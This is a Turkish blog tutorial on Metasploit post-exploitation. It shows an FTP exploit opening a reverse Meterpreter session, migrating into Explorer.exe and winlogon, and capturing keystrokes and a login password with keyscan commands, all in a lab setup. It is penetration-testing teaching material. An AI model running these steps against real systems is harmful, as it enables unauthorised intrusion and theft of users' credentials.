---

authors:
  - name: İbrahim Korucuoğlu
    link: https://github.com/siberoloji
    image: https://github.com/siberoloji.png


categories:
- Metasploit Framework
classicmag_header_overlay:
- global-layout
classicmag_post_layout:
- layout-1
classicmag_post_sidebar_option:
- right-sidebar
cmplz_hide_cookiebanner:
- ""
date: "2017-06-15T13:54:00Z"
excerpt: Bir hedef bilgisayara başarılı bir oturum açtığınızda, mevcut yetkiler izin
  veriyorsa ilk düşünülmesi gereken kalıcılık sağlamaktır. Kalıcılık, hedef sisteme
  daha sonradan giriş için açık kapılar oluşturulması veya daha kolay giriş yöntemleri
  bulunmasını kapsar.
guid: https://www.siberoloji.com/?p=1213
id: 1213
image: /assets/images/2024/06/metasploit.jpg
post_views_count:
- "0"
tags:
- cybersecurity
- metasploit framework
title: MSF Meterpreter Kalıcılık Sağlama
url: /tr/msf-meterpreter-kalicilik-saglama/
---

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="kalıcılık-sağlama">Kalıcılık Sağlama 
<!-- /wp:heading -->

  Bir hedef bilgisayara başarılı bir oturum açtığınızda, mevcut yetkiler izin veriyorsa ilk düşünülmesi gereken kalıcılık sağlamaktır. Kalıcılık, hedef sisteme daha sonradan giriş için açık kapılar oluşturulması veya daha kolay giriş yöntemleri bulunmasını kapsar. 
 

  Bazı durumlarda, hedef üzerinde yaptığınız çalışmalar sistemi kararsız hale getirebilir. Sistemin tekrar başlatılması gerektiğinde bağlantınız da kopacaktır. Bu gibi durumlar için, hedef sisteme tekrar bağlanmanın kolay bir yolunu oluşturmak faydalı olacaktır. 
 

  Kalıcılık sağlamak için sistem hakkında kullanıcı bilgileri, token bilgileri, hash bilgileri ve bağlı olduğu diğer alt ağların keşfi ileride kullanım için oldukça fayda sağlamaktadır. 
 

  Bilgi toplamanın bir yöntemi de keylogger olarak ifade edilen yöntemdir. 
 

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="metasploit-içinde-keylogger-kullanımı">Metasploit içinde Keylogger Kullanımı 
<!-- /wp:heading -->

  Bir sisteme giriş sağlandığında iki yaklaşım sergileyebilirsiniz. <em>Çok hızlı</em> olmak veya <em>çok yavaş</em> olmak. Keylogger, yani kullanıcının tuşlarını ve yazdıklarını kaydetmek, yavaş yaklaşıma bir örnektir. Bu yaklaşımda, gerçekleştirmek istediğiniz işlemleri çok hızlı yapamazsınız ancak uzun vadede çok kullanışlı bilgiler elde edebilirsiniz. 
 

  Öncelikle, bir exploit modülü kullanarak hedef sistemde oturum çalım. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf exploit<strong>(</strong>warftpd_165_user<strong>)</strong> <strong>&gt;</strong> exploit

<strong>[</strong><strong>*</strong><strong>]</strong> Handler binding to LHOST 0.0.0.0
<strong>[</strong><strong>*</strong><strong>]</strong> Started reverse handler
<strong>[</strong><strong>*</strong><strong>]</strong> Connecting to FTP server 172.16.104.145:21...
<strong>[</strong><strong>*</strong><strong>]</strong> Connected to target FTP server.
<strong>[</strong><strong>*</strong><strong>]</strong> Trying target Windows 2000 SP0-SP4 English...
<strong>[</strong><strong>*</strong><strong>]</strong> Transmitting intermediate stager <strong>for </strong>over-sized stage...<strong>(</strong>191 bytes<strong>)</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> Sending stage <strong>(</strong>2650 bytes<strong>)</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> Sleeping before handling stage...
<strong>[</strong><strong>*</strong><strong>]</strong> Uploading DLL <strong>(</strong>75787 bytes<strong>)</strong>...
<strong>[</strong><strong>*</strong><strong>]</strong> Upload completed.
<strong>[</strong><strong>*</strong><strong>]</strong> Meterpreter session 4 opened <strong>(</strong>172.16.104.130:4444 -&gt; 172.16.104.145:1246<strong>)</strong>

meterpreter <strong>&gt;</strong>
</code></pre>
<!-- /wp:code -->

  Oturum açıldıktan sonra, tuşları kayıt etmek için&nbsp;<code>Explorer.exe</code>&nbsp;prosesine geçmek başarı için daha garanti bir yoldur. Hedef sistemde&nbsp;<code>Explorer.exe</code>&nbsp;uygulaması, hangi PID numarasıyla çalışıyor öğreniyoruz ve&nbsp;<code>migrate</code>&nbsp;komutuyla geçiş yapıyoruz. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> ps

Process list
<strong>============</strong>

    PID   Name               Path                                                   
    ---   ----               ----                                                   
    140   smss.exe           \SystemRoot\System32\smss.exe                          
    188   winlogon.exe       ??\C:\WINNT\system32\winlogon.exe                     
    216   services.exe       C:\WINNT\system32\services.exe                         
    228   lsass.exe          C:\WINNT\system32\lsass.exe                            
    380   svchost.exe        C:\WINNT\system32\svchost.exe                          
    408   spoolsv.exe        C:\WINNT\system32\spoolsv.exe                          
    444   svchost.exe        C:\WINNT\System32\svchost.exe                          
    480   regsvc.exe         C:\WINNT\system32\regsvc.exe                           
    500   MSTask.exe         C:\WINNT\system32\MSTask.exe                           
    528   VMwareService.exe  C:\Program Files\VMwareVMware Tools\VMwareService.exe 
    588   WinMgmt.exe        C:\WINNT\System32\WBEMWinMgmt.exe                     
    664   notepad.exe        C:\WINNT\System32\notepad.exe                          
    724   cmd.exe            C:\WINNT\System32\cmd.exe                              
    768   Explorer.exe       C:\WINNT\Explorer.exe                                  
    800   war-ftpd.exe       C:\Program Files\War-ftpd\war-ftpd.exe                 
    888   VMwareTray.exe     C:\Program Files\VMware\VMware Tools\VMwareTray.exe    
    896   VMwareUser.exe     C:\Program Files\VMware\VMware Tools\VMwareUser.exe    
    940   firefox.exe        C:\Program Files\Mozilla Firefox\firefox.exe           
    972   TPAutoConnSvc.exe  C:\Program Files\VMware\VMware Tools\TPAutoConnSvc.exe 
    1088  TPAutoConnect.exe  C:\Program Files\VMware\VMware Tools\TPAutoConnect.exe 

meterpreter <strong>&gt;</strong> migrate 768
<strong>[</strong><strong>*</strong><strong>]</strong> Migrating to 768...
<strong>[</strong><strong>*</strong><strong>]</strong> Migration completed successfully.
meterpreter <strong>&gt;</strong> getpid
Current pid: 768
</code></pre>
<!-- /wp:code -->

  PID geçişini kontrol ettikten sonra keylogger işlemini başlatalım. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> keyscan_start
Starting the keystroke sniffer...
meterpreter <strong>&gt;</strong> keyscan_dump
Dumping captured keystrokes...
   tgoogle.cm my credit amex   myusernamthi     amexpasswordpassword
</code></pre>
<!-- /wp:code -->

  Bir miktar süre geçtikten sonra kayıt dosyasını görmek için&nbsp;<code>keyscan_dump</code>&nbsp;komutunu kullanabilirsiniz. Yakalanan tuş vuruşlarını incelediğinizde, CTRL veya ALT gibi tuşların log dosyasına nasıl kayıt edildiğini de öğrenebilirsiniz. 
 

  Ayrıca, oturum açma bilgilerini de yakalamak isterseniz,&nbsp;<code>Explorer.exe</code>&nbsp;yerine&nbsp;<code>migrate</code>&nbsp;komutuyla,&nbsp;<code>winlogon</code>&nbsp;prosesine geçebilirsiniz. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> ps

Process list
<strong>=================</strong>

PID Name         Path
--- ----         ----
401 winlogon.exe C:\WINNT\system32\winlogon.exe

meterpreter <strong>&gt;</strong> migrate 401

<strong>[</strong><strong>*</strong><strong>]</strong> Migrating to 401...
<strong>[</strong><strong>*</strong><strong>]</strong> Migration completed successfully.

meterpreter <strong>&gt;</strong> keyscan_start
Starting the keystroke sniffer...
</code></pre>
<!-- /wp:code -->

  Kayıt esnasında bir Administrator kullanıcı oturumu açılmıştır. Sonucuna bakalım. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> keyscan_dump
Dumping captured keystrokes...
Administrator ohnoes1vebeenh4x0red!
</code></pre>
<!-- /wp:code -->

  Görüldüğü gibi, oturum açan kullanıcı “Administrator” ve parolası “ohnoes1vebeenh4x0red!” olarak tespit edilmiştir. 
 